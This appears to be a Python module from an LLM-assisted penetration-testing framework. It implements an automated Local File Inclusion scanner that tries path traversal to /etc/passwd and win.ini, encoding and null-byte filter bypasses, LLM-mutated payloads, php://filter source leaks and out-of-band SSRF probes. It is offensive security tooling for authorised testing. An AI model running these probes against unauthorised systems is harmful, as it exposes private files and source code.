from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, ClassVar, List
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from penage.core.actions import Action, ActionType
from penage.core.candidates import CandidateAction
from penage.core.observations import Observation
from penage.core.state import FilterModel, State
from penage.core.tracer import JsonlTracer
from penage.llm.base import LLMClient
from penage.memory.store import MemoryStore
from penage.specialists.base import AsyncSpecialist, SpecialistConfig
from penage.specialists.shared.oob_listener import OobListener
from penage.specialists.shared.path_traversal import (
    detect_lfi_markers,
    generate_traversal_variants,
)
from penage.specialists.shared.payload_mutator import PayloadMutator
from penage.specialists.shared.reflection_analyzer import (
    ReflectionContext,
    ReflectionContextType,
)
from penage.tools.http_backend import HttpBackend

logger = logging.getLogger(__name__)


_DEFAULT_LIBRARY = Path(__file__).resolve().parents[2] / "payloads" / "lfi.yaml"

_SKIP_INPUT_TYPES = frozenset(
    {"hidden", "submit", "reset", "button", "file", "image", "checkbox", "radio", "password"}
)

PARAM_NAME_HINTS = frozenset(
    {
        "file",
        "path",
        "page",
        "include",
        "template",
        "doc",
        "document",
        "view",
        "show",
        "read",
        "load",
        "download",
        "src",
        "filename",
    }
)

_PATH_VALUE_EXTENSIONS = (".php", ".txt", ".log", ".conf", ".ini", ".html", ".htm")


def _value_hints_path(value: str) -> bool:
    if not value:
        return False
    low = value.lower()
    if low.startswith("/") or low.startswith("./") or "../" in low:
        return True
    return any(low.endswith(ext) for ext in _PATH_VALUE_EXTENSIONS)


def _name_hints_lfi(name: str) -> bool:
    low = (name or "").lower()
    if not low:
        return False
    return any(hint in low for hint in PARAM_NAME_HINTS)


@dataclass(slots=True)
class _LfiTarget:
    url: str
    parameter: str
    channel: str  # "GET" | "POST"
    original_value: str = ""


class _BudgetedHttpTool:
    """Caps a specialist's HTTP usage while still bumping the global counters."""

    def __init__(self, inner: HttpBackend, state: State, cap: int) -> None:
        self._inner = inner
        self._state = state
        self._cap = max(0, int(cap))
        self._used = 0

    async def run(self, action: Action) -> Observation:
        if self._used >= self._cap:
            return Observation(ok=False, error="lfi_specialist:budget_exhausted")
        self._used += 1
        self._state.http_requests_used += 1
        self._state.tool_calls_http += 1
        self._state.tool_calls_total += 1
        try:
            return await self._inner.run(action)
        except Exception as exc:  # LEGACY: HTTP boundary
            return Observation(ok=False, error=f"lfi_specialist:http_error:{exc}")

    @property
    def remaining(self) -> int:
        return max(0, self._cap - self._used)


@dataclass(slots=True)
class LfiSpecialist(AsyncSpecialist):
    """Local File Inclusion specialist.

    Five phases per target parameter:

    1. **Target discovery.** Parameters are flagged as LFI candidates when
       their name contains a path-like hint (``file``, ``path``, ``page``,
       ``include`` and relatives) or their current value already looks like a
       path (leading ``/``, ``../``, or a common file extension).
    2. **Deterministic traversal probes.** Payloads from ``lfi.yaml``
       (categories ``unix`` / ``windows`` / ``absolute``) are fired and the
       response body is scanned with
       :func:`penage.specialists.shared.path_traversal.detect_lfi_markers`.
       The first family-specific marker wins — the finding is verified.
    3. **Deterministic bypass variants + LLM mutation.** Interleaved output
       of :func:`generate_traversal_variants` over well-known target files
       (``/etc/passwd``, ``/etc/hosts``, ``C:\\Windows\\win.ini``) and the
       ``bypass`` category of ``lfi.yaml``. Priority order inside the
       generated set puts double-URL-encoded forms first, then single-URL,
       then ``....//``, then null-byte, then raw. When the deterministic
       set is exhausted without a verified hit and a ``llm_client`` is
       wired up, :class:`PayloadMutator` is asked for up to three extra
       candidates which are then fired with the same marker check.
    4. **OOB probing.** Two best-effort probes:

       * ``php://filter/convert.base64-encode/resource=<name>`` — a leaked
         base64 block that decodes to PHP code confirms a
         ``lfi_code_leak_php`` disclosure. Skipped silently on non-PHP
         targets (no code leak = not verified here).
       * ``file://`` /HTTP against a shared :class:`OobListener` URL — an
         inbound hit on the listener proves an LFI/SSRF chain
         (``lfi_ssrf_chain``). Skipped when no listener is wired or it is
         not running.
    5. **Candidate finalization.** When phases 2–4 produce no verified
       hit but phases 2–3 captured partial observations, emits an
       unverified candidate finding: ``lfi_weak_signal`` (score 3.0) on
       ``root:`` / ``/etc/passwd`` fragments that fall short of a real
       passwd line, or ``lfi_size_differential`` (score 2.0) on a very
       large response body with no markers.

    The specialist short-circuits once a verified finding exists and respects
    a local HTTP cap that also bumps the episode's global HTTP counters.

    SAFETY:
      LFI probes are strictly read-only — no destructive payloads are
      ever generated or fired. The strong markers in
      :mod:`penage.specialists.shared.path_traversal` (``root:x:0:0:``,
      ``[fonts]``, a PHP-code-bearing base64 block, ``/proc`` fragments,
      access-log lines) are treated as verified disclosure evidence;
      softer hints (``root:`` without a proper passwd line, a big body
      without markers) only reach phase 5 as unverified candidates so the
      validation gate (CLAUDE.md invariant #4) stays intact.
    """

    name: ClassVar[str] = "lfi"

    http_tool: HttpBackend | None = None
    llm_client: LLMClient | None = None
    memory: MemoryStore | None = None
    tracer: JsonlTracer | None = None
    oob_listener: OobListener | None = None

    payload_library_path: Path = field(default_factory=lambda: _DEFAULT_LIBRARY)
    max_http_budget: int = 30
    max_targets: int = 3
    min_reserve_http: int = 10
    max_deterministic_payloads: int = 8
    max_bypass_payloads: int = 4
    oob_wait_s: float = 5.0

    _done: bool = field(default=False, init=False)
    _attempted: set[str] = field(default_factory=set, init=False)
    _findings: list[dict[str, Any]] = field(default_factory=list, init=False)
    _yaml_cache: list[dict[str, Any]] | None = field(default=None, init=False)
    _observations: dict[str, list[dict[str, Any]]] = field(
        default_factory=dict, init=False,
    )

    def propose(self, state: State, *, config: SpecialistConfig) -> List[CandidateAction]:
        _ = (state, config)
        return []

    async def propose_async(
        self, state: State, *, config: SpecialistConfig
    ) -> List[CandidateAction]:
        if self._done or self.http_tool is None:
            return self._emit_if_any()

        targets = self._discover_targets(state)
        if not targets:
            return []
        if self.max_http_budget < self.min_reserve_http:
            self._note(f"lfi:insufficient_budget cap={self.max_http_budget}")
            return []

        budgeted = _BudgetedHttpTool(self.http_tool, state, cap=self.max_http_budget)
        step = int(getattr(state, "orch_step", 0))

        for target in targets[: self.max_targets]:
            key = f"{target.url}|{target.parameter}"
            if key in self._attempted:
                continue
            if budgeted.remaining < self.min_reserve_http:
                self._note(f"lfi:budget_low remaining={budgeted.remaining}")
                break

            host = _host_of(target.url)

            self._trace_phase(1, "target_discovery", step=step, target=target)

            self._trace_phase(
                2, "deterministic_traversal_probes", step=step, target=target
            )
            finding = await self._run_deterministic_phase(
                target=target,
                http_tool=budgeted,
                host=host,
                config=config,
                step=step,
            )

            if finding and finding.get("verified"):
                self._findings.append(finding)
                self._done = True
                self._attempted.add(key)
                break

            # Phase 3 — deterministic bypass variants.
            if budgeted.remaining >= self.min_reserve_http:
                self._trace_phase(
                    3, "bypass_deterministic", step=step, target=target
                )
                bypass_finding = await self._run_bypass_phase(
                    target=target,
                    http_tool=budgeted,
                    host=host,
                    config=config,
                    step=step,
                )
                if bypass_finding and bypass_finding.get("verified"):
                    self._findings.append(bypass_finding)
                    self._done = True
                    self._attempted.add(key)
                    break

            # Phase 4 — OOB probes (best-effort).
            if budgeted.remaining >= 6:
                self._trace_phase(4, "oob_probing", step=step, target=target)
                oob_finding = await self._run_oob_phase(
                    target=target,
                    http_tool=budgeted,
                    host=host,
                    config=config,
                    step=step,
                )
                if oob_finding and oob_finding.get("verified"):
                    self._findings.append(oob_finding)
                    self._done = True
                    self._attempted.add(key)
                    break

            # Phase 5 — candidate finalization.
            self._trace_phase(5, "candidate_finalization", step=step, target=target)
            candidate = self._finalize_candidate(
                target=target,
                channel=target.channel,
                host_status_observations=self._observations.get(key, []),
            )
            if candidate is not None:
                self._findings.append(candidate)

            self._attempted.add(key)

        return self._emit_if_any()

    def _emit_if_any(self) -> List[CandidateAction]:
        if not self._findings:
            return []
        # Prefer the latest verified finding if any; otherwise fall back to the
        # latest candidate. Verified always wins over unverified.
        verified = [f for f in self._findings if f.get("verified")]
        finding = verified[-1] if verified else self._findings[-1]
        is_verified = bool(finding.get("verified"))
        tag = "verified" if is_verified else "unverified"
        kind = finding.get("kind") or "unknown"
        family = finding.get("family") or kind
        action = Action(
            type=ActionType.NOTE,
            params={"kind": "lfi_finding", "finding": finding},
            tags=["lfi", tag, family],
        )
        if is_verified:
            score = 12.0
        elif kind == "lfi_weak_signal":
            score = 3.0
        else:
            score = 2.0
        return [
            CandidateAction(
                action=action,
                source=self.name,
                score=score,
                cost=0.0,
                reason=finding.get("summary") or "LFI finding",
                metadata={"evidence": finding},
            )
        ]

    async def _run_deterministic_phase(
        self,
        *,
        target: _LfiTarget,
        http_tool: _BudgetedHttpTool,
        host: str,
        config: SpecialistConfig,
        step: int,
    ) -> dict[str, Any] | None:
        """Phase 2: fire payloads from lfi.yaml categories unix + windows + absolute.

        Match markers via :func:`detect_lfi_markers`.
        """
        _ = (config, step)
        obs_key = f"{target.url}|{target.parameter}"
        entries = self._load_yaml_entries(
            categories=("unix", "windows", "absolute"),
            limit=self.max_deterministic_payloads,
        )
        for entry in entries:
            if http_tool.remaining < 2:
                break
            payload = str(entry["payload"])
            probe_url, action_params = _build_probe_action(target, payload)
            action = Action(type=ActionType.HTTP, params=action_params)
            obs = await http_tool.run(action)

            if not obs.ok or not isinstance(obs.data, dict):
                self._record_attempt(
                    host=host,
                    parameter=target.parameter,
                    payload=payload,
                    outcome="error",
                )
                continue

            body = str(obs.data.get("text_full") or "")
            status = obs.data.get("status_code")

            hits = detect_lfi_markers(body)
            if hits:
                primary = hits[0]
                self._record_attempt(
                    host=host,
                    parameter=target.parameter,
                    payload=payload,
                    outcome="verified_disclosure",
                )
                return {
                    "verified": True,
                    "kind": "lfi_disclosure",
                    "mode": "deterministic",
                    "parameter": target.parameter,
                    "payload": payload,
                    "channel": target.channel,
                    "url": probe_url,
                    "family": primary.family.value,
                    "evidence": {
                        "markers": [
                            {
                                "family": h.family.value,
                                "marker": h.marker,
                                "snippet": h.snippet,
                            }
                            for h in hits[:5]
                        ],
                        "response_excerpt": body[:500],
                        "http_status": status,
                        "yaml_id": entry["id"],
                    },
                    "summary": (
                        f"LFI disclosure of {primary.family.value} via {target.parameter}"
                    ),
                }

            self._record_attempt(
                host=host,
                parameter=target.parameter,
                payload=payload,
                outcome="no_signal",
            )
            self._observations.setdefault(obs_key, []).append(
                _make_observation(payload, status, body)
            )
        return None

    async def _run_bypass_phase(
        self,
        *,
        target: _LfiTarget,
        http_tool: _BudgetedHttpTool,
        host: str,
        config: SpecialistConfig,
        step: int,
    ) -> dict[str, Any] | None:
        """Phase 3: deterministic bypass variants.

        Two sources interleaved:

        * **A.** :func:`generate_traversal_variants` for three well-known
          target files (``/etc/passwd``, ``/etc/hosts`` and
          ``C:\\Windows\\win.ini``). Variants are deduplicated then sorted
          by a priority that puts the most filter-evading forms first:
          double-URL-encoded → URL-encoded → ``....//`` → null-byte → raw.
        * **B.** ``lfi.yaml`` entries with ``category == "bypass"`` (already
          includes encoded / null-byte / mixed-slash forms).

        The two streams are interleaved with A first in each pair so the
        most valuable filter-bypass forms race ahead of the yaml list.
        The combined candidate set is capped at ``max_bypass_payloads * 2``
        to keep this phase from swallowing the whole HTTP budget.

        If the deterministic set is exhausted without a verified hit and a
        ``llm_client`` is configured (plus enough HTTP budget remains), the
        specialist asks :class:`PayloadMutator` for up to three additional
        candidates and fires them. A verified mutation returns a finding with
        ``kind == "lfi_mutation_verified"`` and ``evidence.bypass_source ==
        "llm_mutation"``; otherwise the method returns ``None``.
        """
        _ = (config, step)

        well_known = [
            "/etc/passwd",
            "/etc/hosts",
            "C:\\Windows\\win.ini",
        ]
        a_variants: list[str] = []
        for target_file in well_known:
            a_variants.extend(
                generate_traversal_variants(target_file, max_depth=8)
            )

        def _bypass_priority(payload: str) -> int:
            if "%252e" in payload or "%252f" in payload:
                return 1  # double-encoded — most valuable
            if "%2e%2e" in payload or "%2f" in payload:
                return 2  # url-encoded
            if "....//" in payload or "....\\\\" in payload:
                return 3  # filter bypass
            if "%00" in payload:
                return 4  # nullbyte
            return 5  # raw — phase 2 already tried plain forms

        a_variants_sorted = sorted(set(a_variants), key=_bypass_priority)
        obs_key = f"{target.url}|{target.parameter}"

        b_entries = self._load_yaml_entries(categories=("bypass",), limit=4)
        b_variants = [str(e["payload"]) for e in b_entries]

        cap = self.max_bypass_payloads * 2
        candidates: list[str] = []
        seen: set[str] = set()
        for batch in zip(a_variants_sorted, b_variants):
            for p in batch:
                if p in seen:
                    continue
                seen.add(p)
                candidates.append(p)
        for p in a_variants_sorted[len(b_variants):]:
            if p not in seen:
                seen.add(p)
                candidates.append(p)
        candidates = candidates[:cap]

        deterministic_tried = 0
        for payload in candidates:
            if http_tool.remaining < 2:
                break
            deterministic_tried += 1

            probe_url, action_params = _build_probe_action(target, payload)
            action = Action(type=ActionType.HTTP, params=action_params)
            obs = await http_tool.run(action)

            if not obs.ok or not isinstance(obs.data, dict):
                self._record_attempt(
                    host=host,
                    parameter=target.parameter,
                    payload=payload,
                    outcome="error",
                )
                continue

            body = str(obs.data.get("text_full") or "")
            status = obs.data.get("status_code")
            hits = detect_lfi_markers(body)

            if hits:
                primary = hits[0]
                self._record_attempt(
                    host=host,
                    parameter=target.parameter,
                    payload=payload,
                    outcome="verified_bypass",
                )
                return {
                    "verified": True,
                    "kind": "lfi_bypass_verified",
                    "mode": "bypass",
                    "parameter": target.parameter,
                    "payload": payload,
                    "channel": target.channel,
                    "url": probe_url,
                    "family": primary.family.value,
                    "evidence": {
                        "markers": [
                            {
                                "family": h.family.value,
                                "marker": h.marker,
                                "snippet": h.snippet,
                            }
                            for h in hits[:5]
                        ],
                        "response_excerpt": body[:500],
                        "http_status": status,
                        "bypass_source": (
                            "yaml" if payload in b_variants else "generated"
                        ),
                    },
                    "summary": (
                        f"LFI bypass disclosure of {primary.family.value} "
                        f"via {target.parameter}"
                    ),
                }

            self._record_attempt(
                host=host,
                parameter=target.parameter,
                payload=payload,
                outcome="no_signal",
            )
            self._observations.setdefault(obs_key, []).append(
                _make_observation(payload, status, body)
            )

        # Deterministic set exhausted without a verified hit — try LLM mutation.
        if http_tool.remaining < self.min_reserve_http or self.llm_client is None:
            self._note(
                f"lfi:bypass_phase_no_verified deterministic_tried={deterministic_tried} "
                f"mutation_skipped=True"
            )
            return None

        # Synthetic reflection context: for LFI we probe a URL/form parameter,
        # not an HTML reflection point, so no quote/tag/encoding info is known.
        context = ReflectionContext(
            context_type=ReflectionContextType.LFI_PARAM,
            quote_char=None,
            tag_parent=None,
            encoding_observed=None,
        )

        # Empty synthetic FilterModel — LFI has no echo channel to measure
        # character-level transforms, and the mutator is already biased by
        # the category/context we pass in.
        filter_model = FilterModel(
            parameter=target.parameter, channel=target.channel
        )

        mutator = PayloadMutator(
            llm_client=self.llm_client,
            payload_library_path=self.payload_library_path,
        )
        try:
            llm_payloads = await mutator.mutate(
                context=context,
                filter_model=filter_model,
                max_candidates=3,
            )
        except Exception as exc:  # LEGACY: mutator boundary
            self._note(f"lfi:mutation_error {exc}")
            llm_payloads = []

        mutation_tried = 0
        for payload in llm_payloads:
            if http_tool.remaining < 2:
                break
            p = (payload or "").strip()
            if not p:
                continue
            mutation_tried += 1

            probe_url, action_params = _build_probe_action(target, p)
            action = Action(type=ActionType.HTTP, params=action_params)
            obs = await http_tool.run(action)

            if not obs.ok or not isinstance(obs.data, dict):
                self._record_attempt(
                    host=host,
                    parameter=target.parameter,
                    payload=p,
                    outcome="error",
                )
                continue

            body = str(obs.data.get("text_full") or "")
            status = obs.data.get("status_code")
            hits = detect_lfi_markers(body)

            if hits:
                primary = hits[0]
                self._record_attempt(
                    host=host,
                    parameter=target.parameter,
                    payload=p,
                    outcome="verified_mutation",
                )
                return {
                    "verified": True,
                    "kind": "lfi_mutation_verified",
                    "mode": "mutation",
                    "parameter": target.parameter,
                    "payload": p,
                    "channel": target.channel,
                    "url": probe_url,
                    "family": primary.family.value,
                    "evidence": {
                        "markers": [
                            {
                                "family": h.family.value,
                                "marker": h.marker,
                                "snippet": h.snippet,
                            }
                            for h in hits[:5]
                        ],
                        "response_excerpt": body[:500],
                        "http_status": status,
                        "bypass_source": "llm_mutation",
                    },
                    "summary": (
                        f"LFI mutation disclosure of {primary.family.value} "
                        f"via {target.parameter}"
                    ),
                }

            self._record_attempt(
                host=host,
                parameter=target.parameter,
                payload=p,
                outcome="no_signal",
            )
            self._observations.setdefault(obs_key, []).append(
                _make_observation(p, status, body)
            )

        self._note(
            f"lfi:bypass_phase_no_verified deterministic_tried={deterministic_tried} "
            f"mutation_tried={mutation_tried}"
        )
        return None

    async def _run_oob_phase(
        self,
        *,
        target: _LfiTarget,
        http_tool: _BudgetedHttpTool,
        host: str,
        config: SpecialistConfig,
        step: int,
    ) -> dict[str, Any] | None:
        """Phase 4: OOB probes — PHP filter base64 source leak + OOB-listener hit.

        Two best-effort probes. Neither is required; most targets will be
        non-PHP, and most sandboxed labs will not allow outbound HTTP.

        * **A. ``php://filter/convert.base64-encode/resource=<name>``.** The
          resource name is derived from ``target.original_value`` with any
          extension stripped (the filter adds the encoding itself); when
          the original value is empty we fall back to ``index``. A decoded
          base64 block that contains PHP tokens (see
          :func:`detect_lfi_markers`'s ``CODE_LEAK`` branch) is treated as
          a verified ``lfi_code_leak_php`` finding.
        * **B. File/URL probe against the shared OOB listener.** When an
          :class:`OobListener` is wired and running, a fresh canary token
          is registered and its HTTP URL is injected into the parameter.
          The probe is sent concurrently with :meth:`OobListener.wait_for_hit`
          so an inbound request on our listener socket proves the target
          fetched the URL — an LFI/SSRF chain. Returns an
          ``lfi_ssrf_chain`` finding. Falls through silently on timeout or
          listener failures.

        Returns the first verified finding from either probe, otherwise
        ``None``. A trace note ``lfi:oob_phase_no_verified`` is emitted
        with which probes were attempted.
        """
        _ = (config, step)
        php_filter_tried = False
        file_oob_tried = False
        oob_hit = False

        # ---- Probe A: php://filter base64 source disclosure -----------
        if http_tool.remaining >= 2:
            php_filter_tried = True
            resource = target.original_value or "index"
            if "." in resource:
                resource = resource.rsplit(".", 1)[0]
            if not resource:
                resource = "index"
            payload = f"php://filter/convert.base64-encode/resource={resource}"

            probe_url, action_params = _build_probe_action(target, payload)
            action = Action(type=ActionType.HTTP, params=action_params)
            obs = await http_tool.run(action)

            if obs.ok and isinstance(obs.data, dict):
                body = str(obs.data.get("text_full") or "")
                status = obs.data.get("status_code")
                hits = detect_lfi_markers(body)
                code_leak = next(
                    (h for h in hits if h.family.value == "code_leak"), None
                )
                if code_leak is not None:
                    self._record_attempt(
                        host=host,
                        parameter=target.parameter,
                        payload=payload,
                        outcome="verified_php_code_leak",
                    )
                    return {
                        "verified": True,
                        "kind": "lfi_code_leak_php",
                        "mode": "oob_php_filter",
                        "parameter": target.parameter,
                        "payload": payload,
                        "channel": target.channel,
                        "url": probe_url,
                        "family": "code_leak",
                        "evidence": {
                            "markers": [
                                {
                                    "family": code_leak.family.value,
                                    "marker": code_leak.marker,
                                    "snippet": code_leak.snippet,
                                }
                            ],
                            "response_excerpt": body[:500],
                            "http_status": status,
                            "bypass_source": "php_filter",
                        },
                        "summary": (
                            f"LFI code disclosure (PHP base64) via "
                            f"{target.parameter}"
                        ),
                    }
            else:
                self._record_attempt(
                    host=host,
                    parameter=target.parameter,
                    payload=payload,
                    outcome="error",
                )

        # ---- Probe B: OOB-listener file/url hit ------------------------
        if (
            self.oob_listener is not None
            and self.oob_listener.is_running
            and http_tool.remaining >= 2
        ):
            file_oob_tried = True
            token: str | None = None
            oob_url: str | None = None
            try:
                token, oob_url = await self.oob_listener.register_token()
            except Exception as exc:  # LEGACY: listener boundary
                self._note(f"lfi:oob_register_failed {exc}")

            if oob_url is not None:
                payload = oob_url
                probe_url, action_params = _build_probe_action(target, payload)
                action = Action(type=ActionType.HTTP, params=action_params)

                send_task = asyncio.create_task(http_tool.run(action))
                wait_task = asyncio.create_task(
                    self.oob_listener.wait_for_hit(token, timeout_s=self.oob_wait_s)
                )
                await asyncio.gather(send_task, wait_task, return_exceptions=True)
                send_obs = send_task.result() if send_task.done() else None
                hit_result = wait_task.result() if wait_task.done() else None
                hit = hit_result if not isinstance(hit_result, Exception) else None

                if hit is not None:
                    oob_hit = True
                    self._record_attempt(
                        host=host,
                        parameter=target.parameter,
                        payload=payload,
                        outcome="verified_oob",
                    )
                    body_excerpt = ""
                    if send_obs is not None and send_obs.ok and isinstance(
                        send_obs.data, dict
                    ):
                        body_excerpt = str(
                            send_obs.data.get("text_full") or ""
                        )[:300]
                    return {
                        "verified": True,
                        "kind": "lfi_ssrf_chain",
                        "mode": "oob_file_url",
                        "parameter": target.parameter,
                        "payload": payload,
                        "channel": target.channel,
                        "url": probe_url,
                        "family": "code_leak",
                        "evidence": {
                            "oob_hit": {
                                "remote_addr": hit.remote_addr,
                                "path": hit.path,
                            },
                            "response_excerpt": body_excerpt,
                            "chained_with_ssrf_semantics": True,
                            "bypass_source": "oob_file_url",
                        },
                        "summary": (
                            f"LFI/SSRF chain via {target.parameter} (OOB hit)"
                        ),
                    }

        self._note(
            f"lfi:oob_phase_no_verified php_filter_tried={php_filter_tried} "
            f"file_oob_tried={file_oob_tried} oob_hit={oob_hit}"
        )
        return None

    def _finalize_candidate(
        self,
        *,
        target: _LfiTarget,
        channel: str,
        host_status_observations: list[dict[str, Any]],
    ) -> dict[str, Any] | None:
        """Phase 5: assemble a candidate finding from partial phase-2/3 observations.

        ``host_status_observations`` is the list collected under
        ``self._observations[key]`` across phases 2–3: one entry per probe
        that produced a benign (``no_signal``) HTTP response, with
        ``weak_marker`` / ``size_anomaly`` flags.

        Preference order:

        1. ``lfi_weak_signal`` — any observation with a ``root:`` line that
           is *not* a real passwd line, or a body that mentions
           ``/etc/passwd`` / ``win.ini`` as strings (likely error output
           from a blocked include). Score 3.0.
        2. ``lfi_size_differential`` — a response body over 1500 chars
           without any strong or weak markers. This can indicate a
           filter-stripped include that leaked the included source
           without the usual markers. Score 2.0.

        Returns ``None`` when no observation qualifies — the specialist
        then emits no candidate for this target.
        """
        weak = next(
            (o for o in host_status_observations if o.get("weak_marker")),
            None,
        )
        if weak is not None:
            return {
                "verified": False,
                "kind": "lfi_weak_signal",
                "mode": "candidate",
                "parameter": target.parameter,
                "payload": weak["payload"],
                "channel": channel,
                "url": "",
                "family": "unknown",
                "evidence": {
                    "weak_marker": True,
                    "response_excerpt": weak["body_excerpt"],
                    "http_status": weak["status"],
                },
                "reason": "partial_marker",
                "summary": f"Weak LFI signal on {target.parameter}",
            }

        size_anom = next(
            (o for o in host_status_observations if o.get("size_anomaly")),
            None,
        )
        if size_anom is not None:
            return {
                "verified": False,
                "kind": "lfi_size_differential",
                "mode": "candidate",
                "parameter": target.parameter,
                "payload": size_anom["payload"],
                "channel": channel,
                "url": "",
                "family": "unknown",
                "evidence": {
                    "size_anomaly": True,
                    "response_excerpt": size_anom["body_excerpt"],
                    "http_status": size_anom["status"],
                },
                "reason": "response_size_anomaly",
                "summary": f"Size-differential LFI candidate on {target.parameter}",
            }

        return None

    @staticmethod
    def _has_weak_marker(body: str) -> bool:
        """Return True if ``body`` carries a soft LFI signal.

        Weak signals are strings that hint at include-parameter processing
        without proving a real disclosure: a ``root:`` line that is not a
        proper passwd entry, or the literal paths ``/etc/passwd`` /
        ``win.ini`` echoed back (often by error messages from a blocked
        include). These are explicitly *not* strong enough to mark a
        finding verified.
        """
        if not body:
            return False
        low = body.lower()
        if "root:" in low and "root:x:0:0:" not in low:
            return True
        if "/etc/passwd" in low or "win.ini" in low:
            return True
        return False

    def _discover_targets(self, state: State) -> list[_LfiTarget]:
        targets: list[_LfiTarget] = []
        seen: set[tuple[str, str]] = set()

        for page_url, forms in (state.forms_by_url or {}).items():
            for form in forms or []:
                action_url = str(form.get("action") or page_url or "")
                if not action_url:
                    continue
                method = str(form.get("method") or "POST").upper()
                if method not in {"GET", "POST"}:
                    continue
                for inp in form.get("inputs") or []:
                    name = str(inp.get("name") or "")
                    itype = str(inp.get("type") or "").lower()
                    if not name or itype in _SKIP_INPUT_TYPES:
                        continue
                    value = str(inp.get("value") or "")
                    if not (_name_hints_lfi(name) or _value_hints_path(value)):
                        continue
                    key = (action_url, name)
                    if key in seen:
                        continue
                    seen.add(key)
                    targets.append(
                        _LfiTarget(
                            url=action_url,
                            parameter=name,
                            channel=method,
                            original_value=value,
                        )
                    )

        last_url = state.last_http_url
        if last_url:
            try:
                parsed = urlparse(last_url)
            except Exception:
                parsed = None
            if parsed is not None and parsed.query:
                base = urlunparse(parsed._replace(query=""))
                for name, value in parse_qsl(parsed.query, keep_blank_values=True):
                    if not (_name_hints_lfi(name) or _value_hints_path(value)):
                        continue
                    key = (base, name)
                    if key in seen:
                        continue
                    seen.add(key)
                    targets.append(
                        _LfiTarget(
                            url=base,
                            parameter=name,
                            channel="GET",
                            original_value=value,
                        )
                    )

        return targets

    def _load_yaml_entries(
        self,
        *,
        categories: tuple[str, ...],
        limit: int,
    ) -> list[dict[str, Any]]:
        """Load and filter payload entries from ``lfi.yaml``.

        Returns up to ``limit`` entries whose ``category`` is in ``categories``.
        The full library is cached on the instance to avoid re-parsing the file
        between phases. Missing YAML / parse errors yield an empty list — the
        specialist degrades to a no-op rather than crashing.
        """
        if self._yaml_cache is None:
            self._yaml_cache = _load_lfi_library(self.payload_library_path)
        allowed = set(categories)
        out: list[dict[str, Any]] = []
        for entry in self._yaml_cache:
            if entry.get("category") not in allowed:
                continue
            if not str(entry.get("payload") or ""):
                continue
            out.append(entry)
            if len(out) >= max(0, int(limit)):
                break
        return out

    def _record_attempt(
        self, *, host: str, parameter: str, payload: str, outcome: str
    ) -> None:
        if self.memory is None:
            return
        try:
            self.memory.record_attempt(
                episode_id=self._episode_id(),
                host=host,
                parameter=parameter,
                payload=payload,
                outcome=outcome,
            )
        except Exception as exc:
            logger.warning("lfi memory record_attempt failed: %s", exc)

    def _trace_phase(
        self,
        phase_num: int,
        name: str,
        *,
        step: int,
        target: _LfiTarget,
        extra: dict[str, Any] | None = None,
    ) -> None:
        if self.tracer is None:
            return
        payload: dict[str, Any] = {
            "specialist": self.name,
            "phase": phase_num,
            "phase_name": name,
            "step": step,
            "url": target.url,
            "parameter": target.parameter,
            "channel": target.channel,
        }
        if extra:
            payload.update(extra)
        try:
            self.tracer.write_event("specialist_phase", payload)
        except Exception as exc:
            logger.warning("lfi tracer write failed: %s", exc)

    def _note(self, text: str) -> None:
        if self.tracer is None:
            return
        try:
            self.tracer.record_note(text)
        except Exception as exc:
            logger.warning("lfi tracer note failed: %s", exc)

    def _episode_id(self) -> str:
        if self.tracer is not None:
            return str(self.tracer.episode_id)
        return "no-episode"


def _load_lfi_library(path: Path) -> list[dict[str, Any]]:
    try:
        import yaml  # noqa: WPS433 — keep yaml soft-optional
    except ImportError as exc:
        logger.warning("PyYAML not installed (%s); lfi library unavailable", exc)
        return []
    if not path.exists():
        logger.warning("lfi library missing at %s", path)
        return []
    try:
        raw = yaml.safe_load(path.read_text(encoding="utf-8")) or []
    except Exception as exc:
        logger.warning("failed to parse lfi library %s: %s", path, exc)
        return []
    if not isinstance(raw, list):
        return []
    entries: list[dict[str, Any]] = []
    for item in raw:
        if not isinstance(item, dict):
            continue
        entries.append(
            {
                "id": str(item.get("id") or ""),
                "category": str(item.get("category") or ""),
                "family": str(item.get("family") or ""),
                "depth": int(item.get("depth") or 0),
                "payload": str(item.get("payload") or ""),
                "expected_markers": list(item.get("expected_markers") or []),
                "notes": str(item.get("notes") or ""),
            }
        )
    return entries


def _make_observation(
    payload: str, status: Any, body: str
) -> dict[str, Any]:
    """Build a phase-2/3 observation record for phase-5 finalization.

    Each observation is a lightweight snapshot of one benign probe:
    the payload, HTTP status, a short body excerpt, and two boolean
    hint flags. Phase 5 scans this list to decide whether to emit an
    unverified candidate.
    """
    return {
        "payload": payload,
        "status": status,
        "body_excerpt": body[:300],
        "weak_marker": LfiSpecialist._has_weak_marker(body),
        "size_anomaly": len(body) > 1500,
    }


def _build_probe_action(
    target: _LfiTarget, payload: str
) -> tuple[str, dict[str, Any]]:
    if target.channel == "GET":
        probe_url = _set_query_param(target.url, target.parameter, payload)
        params: dict[str, Any] = {"method": "GET", "url": probe_url}
        return probe_url, params
    params = {
        "method": "POST",
        "url": target.url,
        "data": {target.parameter: payload},
    }
    return target.url, params


def _set_query_param(url: str, name: str, value: str) -> str:
    parsed = urlparse(url)
    pairs = [
        (k, v)
        for (k, v) in parse_qsl(parsed.query, keep_blank_values=True)
        if k != name
    ]
    pairs.append((name, value))
    return urlunparse(parsed._replace(query=urlencode(pairs, doseq=True)))


def _host_of(url: str) -> str:
    try:
        return (urlparse(url).netloc or "").lower()
    except Exception:
        return ""


__all__ = ["LfiSpecialist", "PARAM_NAME_HINTS"]
